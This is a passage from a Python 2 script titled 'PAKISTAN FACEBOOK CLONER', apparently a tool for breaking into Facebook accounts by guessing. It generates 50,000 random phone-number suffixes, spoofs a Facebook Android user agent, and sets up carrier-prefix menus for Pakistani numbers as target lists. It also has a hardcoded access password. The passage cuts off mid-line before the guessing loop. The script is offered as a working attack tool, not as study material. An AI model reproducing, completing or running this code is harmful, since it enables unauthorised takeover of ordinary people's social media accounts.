#!/usr/bin/python2
#coding=utf-8
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
os.system('rm -rf .txt')
for n in range(50000):
 
    nmbr = random.randint(1111111, 9999999)
    
    sys.stdout = open('.txt', 'a')
 
    print(nmbr)
 
    sys.stdout.flush()
    
try:
    import requests
except ImportError:
    os.system('pip2 install requests')
    
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
    
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
 
 
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
logo="""\033[1;92m
 $$$$$$\            $$\                           $$$$$$\  
$$  __$$\           $$ |                         $$  __$$\ 
$$ /  $$ | $$$$$$$\ $$$$$$$\   $$$$$$\  $$$$$$\  $$ /  \__|
$$$$$$$$ |$$  _____|$$  __$$\ $$  __$$\ \____$$\ $$$$\     
$$  __$$ |\$$$$$$\  $$ |  $$ |$$ |  \__|$$$$$$$ |$$  _|    
$$ |  $$ | \____$$\ $$ |  $$ |$$ |     $$  __$$ |$$ |      
$$ |  $$ |$$$$$$$  |$$ |  $$ |$$ |     \$$$$$$$ |$$ |      
\__|  \__|\_______/ \__|  \__|\__|      \_______|\__|      
                                                           
                Author:Muhammad Ashraf                                           
                                                           
"""
def exb():
	print '[!] Exit'
	os.sys.exit()
 
def psb(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)
 
def t():
    time.sleep(1)
def cb():
    os.system('clear')
##### ABIRHOSSAIN#####
##### LOGO #####
os.system("clear")
print(logo)
back = 0
successful = []
cpb = []
oks = []
id = []
count=0
while count <9999999:
	   username = raw_input('\033[1;95mEnter username:\033[1;96m  ')
	   print
	   password = raw_input('\033[1;95mEnter password:\033[1;96m  ')
	   if password=='Fastlink' and username=='Fastlink':
	       print('Access granted')
	       #os.system("xdg-open https://facebook.com/Abir-Hossain-104247341997068/?substory_index=0")
	       break
	   else:
   	    print('\033[1;94m Access denied. Try again.')
   	    count += 1
   	    print("			\033[1;91mFor User & Password Contact With Owner")
   	    #os.system("xdg-open https://facebook.com/Abir-Hossain-104247341997068/?substory_index=0")
def menu():
	os.system('clear')
	print(logo)
	print
	print "\x1b[1;94m______________________________________"
	print
	print "\033[1;91mPAKISTAN FACEBOOK CLONER"
	print
	print "\033[1;92m[1]  JAZZ"
	print "\033[1;92m[2]  TELENOR"
	print "\033[1;92m[3]  WARID"
	print "\033[1;92m[4]  UFONE"
	print "\033[1;92m[5]  ZONG"
	print "\033[1;92m[6]  CONTACT ME"
	print "\033[1;92m[0]  EXIT"
	print "\x1b[1;94m______________________________________"
	action()
	
def action():	
	bch =raw_input('\033[1;96mENTER ANY NUMBER : ')
	if bch =='':
		print '[!] Fill in correctly'
		action()
	elif bch =="1":
		os.system("clear")
		print(logo)		
		print " \x1b[1;93mJAZZ CODE"
		print
		print " \033[1;91m00, 01, 02, 03, 04,"
		print
		print " \033[1;91m05, 06, 07, 08, 09,"
		print
		try:
			c = raw_input(" \033[1;97mSELECTE CODE: ")
			k="+923"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
	elif bch =="2":			
		os.system("clear")
		print(logo)
		print " \033[1;91mTELENOR CODE"
		print
		print " \033[1;93m40, 41, 42, 43, 44,"
		print
		print " \033[1;93m45, 46,47,48,49"
		print
		try:
			c = raw_input(" \033[1;97mSELECTE CODE: ")
			k="+923"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()
	elif bch =="3":			
		os.system("clear")
		print(logo)
		print " \033[1;96mWARID CODE"
		print		
		print " \033[1;95m20, 21, 22, 23,24"
		print
		try:
			c = raw_input(" \033[1;97mSELECTE CODE: ")
			k="+923"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines():
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]")
			menu()	
	elif bch =="4":
		os.system("clear")
		print(logo)
		print " \033[1;91mUFONE CODE"	
		print
		print " \033[1;94m31, 32, 33, 34,"
		print
		print " \033[1;94m35, 36, 37"
		print
		try:
			c = raw_input(" \033[1;97mSELECTE CODE: ")
			k="+923"
			idlist = ('.txt')
			for line in open(idlist,"r").readlines(): 
				id.append(line.strip())
		except IOError:
			print ("[!] File Not Found")
			raw_input("\n[ Back ]"
